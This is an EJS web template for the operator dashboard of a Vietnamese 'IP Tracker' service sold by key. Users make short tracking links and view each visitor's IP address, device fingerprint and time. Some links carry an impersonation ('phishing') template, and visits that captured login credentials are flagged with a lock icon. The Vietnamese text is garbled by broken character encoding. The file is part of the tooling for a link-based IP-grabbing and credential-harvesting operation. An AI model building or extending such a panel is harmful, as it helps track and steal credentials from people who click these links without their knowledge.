<%- include('partials/header_vietnamese') %>

<nav>
  <ul><li><strong>IP Tracker</strong> by Gemlogin Tool (TuanHaii)</li></ul>
  <ul>
    <li><a href="/key" role="button" class="contrast">Quáº£n lÃ½ Key</a></li>
    <li><details role="list" dir="rtl"><summary aria-haspopup="listbox" role="link"><img src="<%= user.avatar %>" alt="Avatar" style="width: 32px; height: 32px; border-radius: 50%; vertical-align: middle;"> <%= user.username %></summary><ul role="listbox"><li><a href="/auth/logout">ÄÄƒng xuáº¥t</a></li></ul></details></li>
  </ul>
</nav>

<!-- XÃ“A VÃ™NG THÃ”NG BÃO TÄ¨NH ÄI -->
<% if (!hasActiveKey) { %>
    <article class="custom-warning">
        Key cá»§a báº¡n chÆ°a Ä‘Æ°á»£c kÃ­ch hoáº¡t hoáº·c Ä‘Ã£ háº¿t háº¡n. Vui lÃ²ng vÃ o trang <b>Quáº£n lÃ½ Key</b> Ä‘á»ƒ cÃ¡c tÃ­nh nÄƒng Ä‘Æ°á»£c má»Ÿ khÃ³a.
    </article>
    <style>.custom-warning { border-left: 5px solid var(--pico-color-amber-500); padding: 0.1rem 1.5rem; } </style>
<% } %>

<fieldset <%= !hasActiveKey ? 'disabled' : '' %> >
  <hgroup><h2>Táº¡o liÃªn káº¿t theo dÃµi má»›i</h2><p>Giáº£i Captcha Ä‘á»ƒ kÃ­ch hoáº¡t nÃºt "Táº¡o liÃªn káº¿t".</p></hgroup>
  <form action="/create-link" method="POST"><input type="url" name="targetUrl" placeholder="https://url-dich-cua-ban.com" required><div class="h-captcha" data-sitekey="<%= hcaptcha_site_key %>" data-callback="onLinkCaptchaSuccess" data-expired-callback="onLinkCaptchaExpired"></div><button id="create-link-btn" type="submit" disabled>Táº¡o liÃªn káº¿t</button></form>
</fieldset>
<hr>

<h2>LiÃªn káº¿t & Káº¿t quáº£ cá»§a báº¡n</h2>
<small><em>CÃ¡c liÃªn káº¿t khÃ´ng cÃ³ lÆ°á»£t truy cáº­p trong 2 ngÃ y sáº½ tá»± Ä‘á»™ng bá»‹ xÃ³a.</em></small>

<% if (links.length === 0) { %><p style="margin-top: 1rem;">Báº¡n chÆ°a táº¡o liÃªn káº¿t nÃ o.</p><% } else { %>
    <% links.forEach(link => { %>
        <article>
            <header style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem;">
                <div><strong>LiÃªn káº¿t:</strong> <code style="cursor: pointer;" onclick="copyAndNotify('<%= baseUrl %>/t/<%= link.shortId %>')"><%= baseUrl %>/t/<%= link.shortId %></code></div>
                <div style="display:flex; gap: 0.5rem;">
                    <a href="/link/settings/<%= link.shortId %>" role="button" class="contrast" style="padding: 5px 10px; margin: 0; white-space: nowrap;">CÃ i Ä‘áº·t</a>
                    <form action="/delete-link/<%= link.shortId %>" method="POST" onsubmit="return confirm('Báº¡n cÃ³ cháº¯c muá»‘n xÃ³a liÃªn káº¿t nÃ y vÃ  táº¥t cáº£ káº¿t quáº£ khÃ´ng?');" style="margin:0;"><button type="submit" class="secondary outline" style="padding: 5px 10px; margin: 0; white-space: nowrap;">XÃ³a</button></form>
                </div>
            </header>
            <p style="overflow-wrap: break-word; margin-bottom: 0.5rem;"><strong>ÄÃ­ch:</strong> <a href="<%= link.targetUrl %>" target="_blank" rel="noopener noreferrer"><%= link.targetUrl %></a></p>
            <% if (link.phishTemplate) { %><small><strong style="color:var(--pico-color-red-400)">âš ï¸ Giáº£ máº¡o: <%= link.phishTemplate %></strong></small><% } %>
            <% if (link.Visits && link.Visits.length > 0) { %>
                <div class="overflow-auto" style="margin-top: 1rem;">
                    <table>
                        <thead><tr><th>ID Thiáº¿t bá»‹</th><th>Äá»‹a chá»‰ IP</th><th>Thá»i gian</th><th style="text-align: right;">HÃ nh Ä‘á»™ng</th></tr></thead>
                        <tbody>
                            <% link.Visits.forEach(visit => { %>
                                <tr id="visit-row-<%= visit.id %>">
                                    <td><code><%= visit.fingerprintId %></code> <% if(visit.Credential) { %> <span title="CÃ³ thÃ´ng tin Ä‘Äƒng nháº­p">ğŸ”’</span> <% } %></td>
                                    <td><%= visit.ipAddress %></td>
                                    <td><%= new Date(visit.timestamp).toLocaleString('vi-VN') %></td>
                                    <td style="text-align: right; white-space: nowrap;">
                                        <a href="<%= hasActiveKey ? '/details/' + visit.id : '#' %>" role="button" class="contrast" <%= !hasActiveKey ? 'aria-disabled="true"' : '' %> onclick="<%= !hasActiveKey ? "showSwalNotification('YÃªu cáº§u Key', 'Vui lÃ²ng kÃ­ch hoáº¡t Key Ä‘á»ƒ xem chi tiáº¿t.', 'warning'); return false;" : "" %>" style="padding: 5px 10px; margin:0 5px 0 0;">Chi tiáº¿t</a>
                                        <a href="#" role="button" class="secondary" style="padding: 5px 10px; margin:0;" onclick="deleteVisit(event, '<%= visit.id %>')">XÃ³a</a>
                                    </td>
                                </tr>
                            <% }) %>
                        </tbody>
                    </table>
                </div>
            <% } else { %> <p style="margin-top: 1rem;"><em>ChÆ°a cÃ³ lÆ°á»£t truy cáº­p.</em></p> <% } %>
        </article>
    <% }) %>
<% } %>

<%- include('partials/footer_vietnamese') %>

<script>
    // --- KHAI BÃO BIáº¾N STATUS Tá»ª SERVER ---
    const pageStatus = <%- JSON.stringify(status || null) %>;

    // --- LOGIC CAPTCHA ---
    const createLinkBtn = document.getElementById('create-link-btn');
    function onLinkCaptchaSuccess(token) { if(createLinkBtn) createLinkBtn.disabled = false; }
    function onLinkCaptchaExpired() { if(createLinkBtn) createLinkBtn.disabled = true; }

    // --- LOGIC HÃ€NH Äá»˜NG Cá»¦A TRANG ---
    function copyAndNotify(text){
        navigator.clipboard.writeText(text).then(() => {
            showSwalNotification('Sao chÃ©p thÃ nh cÃ´ng!', 'LiÃªn káº¿t Ä‘Ã£ Ä‘Æ°á»£c sao chÃ©p vÃ o bá»™ nhá»› táº¡m.', 'success');
        }).catch(err => {
            showSwalNotification('Sao chÃ©p tháº¥t báº¡i!', '', 'error');
        });
    }

    async function deleteVisit(event, visitId) {
        event.preventDefault();

        const result = await Swal.fire({
            title: 'Báº¡n cÃ³ cháº¯c cháº¯n?',
            text: "Báº¡n sáº½ khÃ´ng thá»ƒ hoÃ n tÃ¡c hÃ nh Ä‘á»™ng nÃ y!",
            icon: 'warning',
            showCancelButton: true,
            confirmButtonText: 'VÃ¢ng, xÃ³a nÃ³!',
            cancelButtonText: 'Há»§y bá»',
            denyButtonText: 'Tá»« chá»‘i',
            confirmButtonColor: '#fa5252',
            cancelButtonColor: '#495057',
            customClass: { popup: 'swal2-dark' }
        });

        if (!result.isConfirmed) return;

        try {
            const response = await fetch(`/delete-visit/${visitId}`, { method: 'POST' });
            const data = await response.json();
            if (data.success) {
                document.getElementById(`visit-row-${visitId}`)?.remove();
                showSwalNotification('ÄÃ£ xÃ³a!', 'Káº¿t quáº£ Ä‘Ã£ Ä‘Æ°á»£c xÃ³a thÃ nh cÃ´ng.', 'success');
            } else {
                showSwalNotification('Lá»—i', data.message || 'KhÃ´ng thá»ƒ xÃ³a káº¿t quáº£.', 'error');
            }
        } catch (error) {
            showSwalNotification('Lá»—i', 'ÄÃ£ xáº£y ra lá»—i khi xÃ³a káº¿t quáº£.', 'error');
        }
    }
    
    // --- HIá»‚N THá»Š THÃ”NG BÃO KHI TRANG Táº¢I ---
    document.addEventListener('DOMContentLoaded', () => {
        if (!pageStatus) return;

        const messages = {
            link_created: { title: 'Táº¡o liÃªn káº¿t thÃ nh cÃ´ng!', icon: 'success' },
            settings_saved: { title: 'ÄÃ£ lÆ°u cÃ i Ä‘áº·t!', icon: 'success' },
            link_deleted: { title: 'ÄÃ£ xÃ³a liÃªn káº¿t.', icon: 'info' },
            captcha_error: { title: 'Lá»—i Captcha', text: 'XÃ¡c thá»±c khÃ´ng thÃ nh cÃ´ng, vui lÃ²ng thá»­ láº¡i.', icon: 'error' },
            invalid_url: { title: 'URL khÃ´ng há»£p lá»‡', text: 'Vui lÃ²ng nháº­p má»™t URL báº¯t Ä‘áº§u vá»›i http:// hoáº·c https://.', icon: 'error' }
        };

        const message = messages[pageStatus];
        if (message) {
            showSwalNotification(message.title, message.text, message.icon);
        }
    });
</script>
